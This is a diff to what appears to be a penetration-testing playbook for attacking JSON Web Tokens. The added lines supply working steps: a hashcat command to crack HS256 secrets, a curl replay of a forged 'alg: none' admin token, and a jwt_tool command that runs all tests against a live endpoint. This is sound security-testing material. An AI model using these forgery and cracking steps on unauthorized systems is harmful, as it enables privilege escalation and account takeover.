@@ -28,7 +28,8 @@ Priority is driven by what the forged token *does*, not by the technique.
 2. **Test signature enforcement:** change a payload claim WITHOUT re-signing and replay. If accepted → signature not verified.
 3. **Test none:** set `alg` to `none` (try `None`, `NONE`, `nOnE`), strip the signature, keep the trailing dot. If accepted → unsigned tokens trusted.
 4. Inspect for `kid`/`jku`/`jwk` header params (injection surface).
-5. If HS256, try cracking the secret (cheap, fast).
+5. If HS256, try cracking the secret (cheap, fast): `hashcat -a 0 -m 16500 <jwt> /path/to/jwt.secrets.list` (wordlist: https://github.com/wallarm/jwt-secrets).
+6. **Not a JWT?** No `eyJ..` header / not three base64url dot-segments → use `/custom-opaque-tokens`.
 
 ## Exploitation
 - **Signature not verified:** library used `decode()` not `verify()`. Tamper any claim, send.
@@ -58,7 +59,13 @@ header  = base64url({"alg":"none","typ":"JWT"})
 payload = base64url({"sub":"<authorized-test-user>","isAdmin":true})
 token   = header + "." + payload + "."     # note trailing dot, empty signature
 ```
-Capture the privileged response (e.g. an admin-only endpoint returning 200 / admin data) as proof. Log token + request + response to `./_EXPLOIT/`.
+Replay the forged token and capture the privileged response (admin-only endpoint returning 200 / admin data) as proof:
+```bash
+curl -i https://target/api/admin -H "Authorization: Bearer $FORGED"
+```
+Log token + request + response to `./_EXPLOIT/`.
+
+Optional fast first-pass (if installed): `jwt_tool <jwt> -M at -t <url> -rh 'Authorization: Bearer '` runs the all-tests playbook against the live endpoint. Install (not on PyPI): `git clone https://github.com/ticarpi/jwt_tool && pip install -r jwt_tool/requirements.txt`. It does nothing for opaque (non-JWT) tokens and complements — never replaces — the manual checks above.
 
 ## Chain for impact
 A forged or elevated token is a means, not the end:
